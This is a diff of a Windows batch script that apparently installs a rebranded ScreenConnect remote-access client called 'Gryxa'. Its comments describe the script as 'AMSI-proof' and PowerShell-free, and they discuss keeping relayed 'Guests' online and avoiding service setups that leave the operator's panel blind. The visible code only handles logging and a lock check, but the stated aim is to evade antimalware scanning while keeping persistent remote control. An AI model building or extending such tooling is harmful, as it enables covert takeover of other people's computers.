@@ -1,8 +1,7 @@
 @echo off
-rem OWN_GRYXA BUILD 20260804G7 - PowerShell-free Gryxa install (AMSI-proof fallback)
-rem G7: never bare sc create (panel-blind). After /i require ImagePath gryxa.com; else retry /i.
-rem G6: sc create attempt (superseded — caused RUNNING-but-offline).
-rem G5: arg5=REINSTALL → stop+/x Gryxa PC only + /i.
+rem OWN_GRYXA BUILD 20260804G8 - PowerShell-free Gryxa install (AMSI-proof fallback)
+rem G8: HEAL soft-starts first; never /x while relay Gryxa RUNNING (was killing online Guests).
+rem G7: never bare sc create; after /i require ImagePath gryxa.com.
 setlocal EnableExtensions EnableDelayedExpansion
 
 set "WD=%~1"
@@ -28,7 +27,7 @@ set "SVC=ScreenConnect Client (%GRYXA_FP%)"
 
 if not exist "%WD%" mkdir "%WD%" >nul 2>&1
 if not exist "%STAGE%" mkdir "%STAGE%" >nul 2>&1
-echo [%DATE% %TIME%] own_gryxa G7 begin fp=%GRYXA_FP% reinstall=%REINSTALL% mode=%MODE%>>"%LOG%"
+echo [%DATE% %TIME%] own_gryxa G8 begin fp=%GRYXA_FP% reinstall=%REINSTALL% mode=%MODE%>>"%LOG%"
 
 if exist "%LOCK%" (
   powershell -NoProfile -NonInteractive -Command "if((Test-Path '%LOCK%') -and (((Get-Date)-(Get-Item -LiteralPath '%LOCK%').LastWriteTime).TotalMinutes -lt 20)){exit 0}else{exit 1}" >nul 2>&1
